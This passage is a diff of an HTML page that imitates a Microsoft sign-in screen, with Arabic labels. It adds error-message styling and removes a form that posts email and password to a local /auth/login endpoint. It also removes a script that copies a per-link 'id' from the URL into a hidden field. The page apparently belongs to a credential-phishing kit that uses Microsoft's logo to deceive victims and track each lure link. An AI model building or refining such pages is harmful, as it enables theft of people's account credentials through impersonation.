@@ -50,30 +50,20 @@
     button:hover {
       background: #005a9e;
     }
+    .error-message {
+      background: #fde7e9;
+      color: #a80000;
+      border: 1px solid #d13438;
+      padding: 10px;
+      border-radius: 4px;
+      margin-top: 10px;
+      font-size: 14px;
+      display: none; /* افتراضياً مخفية */
+      text-align: left;
+      direction: rtl;
+    }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
-    <h2>تسجيل الدخول</h2>
-    <form id="loginForm" action="/auth/login" method="POST">
-      <input type="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
-      <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
-      <!-- حقل مخفي لتخزين الرابط المطلوب -->
-      <input type="hidden" id="linkId" name="id">
-      <button type="submit">تسجيل الدخول</button>
-    </form>
-  </div>
-
-  <script>
-    // التقاط linkId من رابط الصفحة (مثل /auth/login?id=xxxx)
-    const params = new URLSearchParams(window.location.search);
-    const linkId = params.get('id');
-    if (linkId) {
-      document.getElementById('linkId').value = linkId;
-    } else {
-      alert("❌ لم يتم تمرير معرف الرابط (id).");
-    }
-  </script>
-</body>
-</html>
+    <img src="https://logincdn.msftauth.net/shared/5/ima
